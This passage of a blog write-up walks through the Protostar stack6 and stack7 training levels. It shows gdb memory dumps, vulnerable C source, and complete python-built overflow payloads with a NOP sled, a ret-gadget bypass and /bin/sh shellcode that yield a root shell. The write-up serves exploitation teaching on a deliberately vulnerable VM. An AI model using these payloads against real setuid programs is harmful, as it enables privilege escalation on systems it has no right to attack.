cwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/user&#39;</span>
exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/stack6&#39;</span>
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          <span style="color:#ae81ff">0</span>        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          <span style="color:#ae81ff">0</span>        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          <span style="color:#ae81ff">0</span>        
	0xb7e97000 0xb7fd5000   0x13e000          <span style="color:#ae81ff">0</span>         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          <span style="color:#ae81ff">0</span>        
	0xb7fde000 0xb7fe2000     0x4000          <span style="color:#ae81ff">0</span>        
	0xb7fe2000 0xb7fe3000     0x1000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
	0xb7fe3000 0xb7ffe000    0x1b000          <span style="color:#ae81ff">0</span>         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> find 0xb7fde000, 0xb7fe2000, 0x42424242
0xb7fde050
0xb7fdf049
0xb7fdf059
<span style="color:#ae81ff">3</span> patterns found.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/80x 0xb7fde050
0xb7fde050:	0x42424242	0x43434343	0x43434343	0x43434343
0xb7fde060:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde070:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde080:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde090:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde100:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde110:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde120:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde130:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde140:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde150:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde160:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde170:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde180:	0x0000000a	0x00000000	0x00000000	0x00000000</code></pre></div>
<p>As we can see we have cleanly overwritten the ret address with &ldquo;B&rdquo;&rsquo;s and have found a possible duplicate address for our shellcode at <code>0xb7fde054</code> (where the &ldquo;C&rdquo;&rsquo;s start).
Now we can actually reuse the payload from the previous level by just adjusting number of &ldquo;A&rdquo;&rsquo;s from 76 to 80 and changing the return address to <code>0xb7fde080</code>
(again a little into the nopsled for reliability):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:~$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*80+&#39;\x80\xe0\xfd\xb7&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&#34;</span> &gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack6 &lt; /tmp/payload 
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�<span style="color:#960050;background-color:#1e0010">&#39;</span>�̀1�Ph//shh/bin��PS�ᙰ

<span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
# </code></pre></div>
<h3 id="stack7">Stack7</h3>

<blockquote>
<p>Stack7 introduces return to .text to gain code execution.</p>

<p>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.</p>

<p>This level is at /opt/protostar/bin/stack7</p>
</blockquote>

<h4 id="source-code-7">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">getpath</span>()
{
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ret;

  printf(<span style="color:#e6db74">&#34;input path please: &#34;</span>); fflush(stdout);

  gets(buffer);

  ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);

  <span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xb0000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb0000000</span>) {
      printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
      _exit(<span style="color:#ae81ff">1</span>);
  }

  printf(<span style="color:#e6db74">&#34;got path %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
  <span style="color:#66d9ef">return</span> strdup(buffer);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  getpath();
}</code></pre></div>
<p>This level adds another, even stricter, check for the return address, which invalidates the stack6 solution,
as now we cannot return to any address starting with <code>0xb</code>.
However, if we return to an address anywhere in the file which contains the opcode for the <code>RET</code> instruction -
that instruction will pop the next address from the stack
and this address won&rsquo;t have any restrictions. So, we can still reuse the code from previous level with a small detour to pass the ret check.</p>

<p>We can use the <code>RET</code> instruction from the <code>main()</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:~$ gdb -q /opt/protostar/bin/stack7
Reading symbols from /opt/protostar/bin/stack7...done.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble main
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
0x08048545 &lt;main+0&gt;:	push   %ebp
0x08048546 &lt;main+1&gt;:	mov    %esp,%ebp
0x08048548 &lt;main+3&gt;:	and    $0xfffffff0,%esp
0x0804854b &lt;main+6&gt;:	call   0x80484c4 &lt;getpath&gt;
0x08048550 &lt;main+11&gt;:	mov    %ebp,%esp
0x08048552 &lt;main+13&gt;:	pop    %ebp
0x08048553 &lt;main+14&gt;:	ret    </code></pre></div>
<p>As we can see it&rsquo;s address is <code>0x08048553</code>. For the second address (location of the shellcode on the stack) - we can try to use the approximate address of <code>0xbffff7e0</code> (from stack5 level) to try to land inside the nopsled.
So, with these adjustments, we can execute our shellcode:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:~$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*80+&#39;\x53\x85\x04\x08&#39;+&#39;\xe0\xf7\xff\xbf&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&#34;</span> &gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack7 &lt; /tmp/payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS�AAAAAAAAAAAAS���������������������������������������������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�<span style="color:#960050;background-color:#1e0010">&#39;</span>�̀1�Ph//shh/bin��PS�ᙰ

<span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
# </code></pre></div>
            </div>
            
            <div class="post-comments">
                
            </div>
            
            <div class="push"></div>
        </div>
        <footer class="footer text-center">
<p>Copyright &copy; 2019  -
<span class="credit">
	Powered by
	<a target="_blank" href="https://gohugo.io">Hugo</a>
	and
	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
</span>
</p>
</footer>

    </body>
